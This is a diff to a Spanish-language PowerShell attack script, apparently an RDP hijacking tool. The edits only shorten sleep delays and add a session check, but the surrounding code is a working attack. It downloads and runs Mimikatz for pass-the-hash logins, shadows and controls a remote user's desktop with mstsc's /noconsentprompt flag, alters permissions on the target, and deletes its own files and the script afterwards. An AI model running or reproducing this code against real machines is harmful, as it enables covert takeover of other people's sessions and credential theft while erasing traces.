@@ -75,7 +75,7 @@ function EnableTLS {
 
         '2' {
 	Write-Host ""
-        Write-Host "Detectando arquitectura del sistema operativo.." -ForegroundColor Magenta ; sleep -milliseconds 1500
+        Write-Host "Detectando arquitectura del sistema operativo.." -ForegroundColor Magenta ; sleep -milliseconds 1000
         Write-Host ""
 	$osarch = wmic path Win32_OperatingSystem get OSArchitecture | findstr 'bits' ; $system = $osarch.trim()
         Write-Host "Sistema de $system detectado, descargando Mimikatz.." -ForegroundColor Green 
@@ -190,7 +190,7 @@ function EnableTLS {
 	Write-Host "Modificando permisos para controlar el equipo remoto.." -ForegroundColor Green }}
 
         default {
-        Write-Host "Opción incorrecta, vuelve a intentarlo de nuevo" -ForegroundColor Magenta ; sleep -milliseconds 2500 }}
+        Write-Host "Opción incorrecta, vuelve a intentarlo de nuevo" -ForegroundColor Magenta ; sleep -milliseconds 2000 }}
 
       } until ($input -in 'ver','controlar')
 
@@ -250,7 +250,7 @@ function EnableTLS {
     
     Write-Host ""
     $shadow = invoke-command -session $RDP[0] -scriptblock {(Get-Process explorer | Select-Object SessionId | Format-List | findstr "Id" | select -First 1).split(':')[1].trim()}
-    Write-Host "Buscando sesiones activas en el equipo.." -ForegroundColor Yellow ; sleep -milliseconds 2500 
+    Write-Host "Buscando sesiones activas en el equipo.." -ForegroundColor Yellow ; sleep -milliseconds 2000 
     if(Test-Path variable:mimikatz) { $admin = "/restrictedadmin" } else { $admin = "/admin" ; $domain = "$null" ; $ntlmpass = "$null" }
     
     if($control -eq 'true') { $mimipwn = "mstsc /v '$computer $admin /shadow:$shadow /control /noconsentprompt' /f"
@@ -263,7 +263,10 @@ function EnableTLS {
     if(Test-Path variable:mimikatz) { powershell $mimipath\mimikatz.exe $passthemimi ; del .\mimikatz.zip ; cmd /c "rd /s /q mimikatz" }
     else { mstsc /v $computer $admin /shadow:$shadow /noconsentprompt /prompt /f }}}
 
+
 Write-Host ""
-Write-Host "Iniciando conexión remota.." -ForegroundColor Blue ; sleep -milliseconds 2500
+$session = get-pssession
+if ($session){ Write-Host "Iniciando conexión remota.." -ForegroundColor Blue ; sleep -milliseconds 2000 }
+else { Write-Host "Algo salió mal :(" -ForegroundColor Red ; sleep -milliseconds 2000 }
 $PScript = $MyInvocation.MyCommand.Definition
 Remove-Item $PScript
